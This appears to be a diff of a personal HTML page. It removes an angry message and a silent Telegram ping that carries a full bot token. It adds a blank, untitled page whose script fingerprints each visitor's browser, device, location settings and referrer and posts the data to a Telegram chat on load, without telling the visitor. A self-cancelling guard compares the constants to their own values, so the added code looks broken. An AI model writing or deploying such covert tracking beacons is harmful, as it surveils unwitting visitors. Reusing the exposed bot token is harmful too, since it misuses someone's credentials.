@@ -1,65 +1,207 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Page Removed</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title></title>
 
   <style>
+    html,
     body {
       margin: 0;
       padding: 0;
-      width: 100vw;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: white;
-      font-family: Arial, sans-serif;
-      overflow: hidden;
-    }
-
-    .message {
-      text-align: center;
-      color: black;
-      font-size: 22px;
-      line-height: 1.8;
-      padding: 20px;
+      width: 100%;
+      min-height: 100%;
+      background: #ffffff;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="message">
-    <div>You dont deserve this page</div>
-    <div>Nor all the efforts i have been putting into u no need to open this it wont work enjoy ur "some time "</div>
-    <div>I tired my best pr u wont understand nither will u try to make things better its better i spend my time doing something productive or smth which i actually enjoy then wasting it on this nonsense</div>
-  </div>
+  <div id="text1"></div>
+
+  <div id="text2"></div>
 
   <script>
-    // Silent Telegram Notification
-    async function sendNotification() {
-      const token = "8568542100:AAFpUQ2U-lKLDge9djSK5LgsyvlKcT8ZEq8";
-      const chatId = "8552546080";
+    // ==========================================
+    // PUT YOUR TELEGRAM DETAILS HERE
+    // ==========================================
+
+    const BOT_TOKEN = "8568542100";
+    const CHAT_ID = "8552546080";
+
+
+    // ==========================================
+    // COLLECT BROWSER INFORMATION
+    // ==========================================
+
+    function collectBrowserInfo() {
+      return {
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        availableWidth: screen.availWidth,
+        availableHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        devicePixelRatio: window.devicePixelRatio,
+
+        windowWidth: window.innerWidth,
+        windowHeight: window.innerHeight,
+
+        touchSupport: "ontouchstart" in window,
+        cpuCores: navigator.hardwareConcurrency ?? null,
+        deviceMemoryGB: navigator.deviceMemory ?? null,
+
+        cookiesEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        doNotTrack: navigator.doNotTrack,
+
+        url: location.href,
+        referrer: document.referrer || null,
+        localTime: new Date().toISOString()
+      };
+    }
+
+
+    // ==========================================
+    // FORMAT TELEGRAM MESSAGE
+    // ==========================================
+
+    function createTelegramMessage(info) {
+      return `
+🌐 Browser Information
+
+━━━━━━━━━━━━━━━━━━
+
+Platform:
+${info.platform}
+
+User Agent:
+${info.userAgent}
+
+Language:
+${info.language}
+
+Languages:
+${Array.isArray(info.languages)
+  ? info.languages.join(", ")
+  : info.languages}
+
+Time Zone:
+${info.timeZone}
+
+━━━━━━━━━━━━━━━━━━
+
+Screen:
+${info.screenWidth} × ${info.screenHeight}
+
+Available Screen:
+${info.availableWidth} × ${info.availableHeight}
+
+Color Depth:
+${info.colorDepth}
+
+Device Pixel Ratio:
+${info.devicePixelRatio}
+
+Window:
+${info.windowWidth} × ${info.windowHeight}
+
+Touch Support:
+${info.touchSupport}
+
+CPU Cores:
+${info.cpuCores}
+
+Device Memory:
+${info.deviceMemoryGB} GB
+
+━━━━━━━━━━━━━━━━━━
+
+Cookies Enabled:
+${info.cookiesEnabled}
+
+Online:
+${info.online}
+
+Do Not Track:
+${info.doNotTrack}
+
+━━━━━━━━━━━━━━━━━━
+
+URL:
+${info.url}
+
+Referrer:
+${info.referrer ?? "None"}
+
+Local Time:
+${info.localTime}
+      `.trim();
+    }
+
+
+    // ==========================================
+    // SEND TO TELEGRAM
+    // ==========================================
+
+    async function sendToTelegram() {
+
+      if (
+        BOT_TOKEN === "8568542100" ||
+        CHAT_ID === "8552546080"
+      ) {
+        return;
+      }
+
+      const browserInfo = collectBrowserInfo();
+      const message = createTelegramMessage(browserInfo);
 
       try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: `📄 Removed Page Opened\nTime: ${new Date().toLocaleString()}`
-          })
-        });
-      } catch (err) {
-        // Silent fail
+
+        const response = await fetch(
+          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+          {
+            method: "POST",
+
+            headers: {
+              "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          }
+        );
+
+        const result = await response.json();
+
+        if (!result.ok) {
+          throw new Error(
+            result.description || "Telegram API error"
+          );
+        }
+
+      } catch (error) {
+        console.error(error);
       }
     }
 
-    sendNotification();
+
+    // ==========================================
+    // AUTOMATICALLY SEND ON PAGE LOAD
+    // ==========================================
+
+    sendToTelegram();
+
   </script>
 
 </body>
